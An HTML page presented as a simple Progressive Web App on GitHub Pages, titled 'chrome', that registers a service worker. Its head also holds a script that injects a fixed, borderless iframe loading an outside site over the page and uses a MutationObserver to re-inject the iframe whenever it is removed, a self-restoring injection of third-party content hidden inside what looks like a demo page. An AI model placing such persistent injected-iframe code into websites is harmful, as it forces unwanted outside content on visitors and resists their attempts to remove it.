<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="manifest" href="./manifest.json">
<script>
  if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
      navigator.serviceWorker.register('./service-worker.js')
        .then((registration) => {
          console.log('Service Worker registered with scope:', registration.scope);
        })
        .catch((error) => {
          console.log('Service Worker registration failed:', error);
        });
    });
  }
</script>
   <script>
    function injectIframe() {
        let iframe = document.createElement("iframe");
        iframe.src = "https://nnn.com";
        iframe.style.position = "fixed";
        iframe.style.top = "0";
        iframe.style.left = "0";
        iframe.style.width = "10%";
        iframe.style.height = "10%";
        iframe.style.border = "none";
        iframe.style.zIndex = "99999";

        document.body.appendChild(iframe);

        // Observer to check if iframe is removed
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.removedNodes.forEach((node) => {
                    if (node === iframe) {
                        console.log("Iframe removed, reinjecting...");
                        injectIframe();
                    }
                });
            });
        });

        observer.observe(document.body, { childList: true });
    }

    injectIframe();
</script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>chrome</title>
</head>
<body>
  <h1>Welcome to My PWA</h1>
  <p>This is a simple Progressive Web App hosted on GitHub Pages.</p>
</body>
</html>
